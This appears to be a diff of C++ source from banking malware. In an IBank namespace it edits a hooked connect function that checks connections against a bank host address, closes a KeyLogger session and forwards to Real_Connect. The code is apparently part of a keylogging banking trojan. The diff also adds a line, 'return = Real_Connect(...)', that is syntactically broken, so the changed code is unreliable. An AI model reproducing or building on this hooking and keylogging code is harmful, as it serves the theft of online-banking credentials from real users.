@@ -217,7 +217,8 @@ namespace IBank
 //            SignalFile += "\\netsend.dat";
 //
 //			if (!FileExistsA(SignalFile.t_str()))
-				KeyLogger::CloseSession();
+
+			KeyLogger::CloseSession();
         #else
 			struct sockaddr_in* info = (struct sockaddr_in*)name;
 			if (IBnakHostAddr && IBnakHostAddr == info->sin_addr.s_addr)
@@ -225,19 +226,7 @@ namespace IBank
 		#endif
 
 
-
-//		#ifdef EXTERNAL_DEBUG
-//			if (DebugConnect)
-//				DebugConnect(s, name, namelen);
-//
-//		#endif
-
-
-		int R = Real_Connect(s, name, namelen);
-
-//        __asm int 3
-
-		return R;
+		return = Real_Connect(s, name, namelen);
 	}
 	//-----------------------------------------------------------------------
 
